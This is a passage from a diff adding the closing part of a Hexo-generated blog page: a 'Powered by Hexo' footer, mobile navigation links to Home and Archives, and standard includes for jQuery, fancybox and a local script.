+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
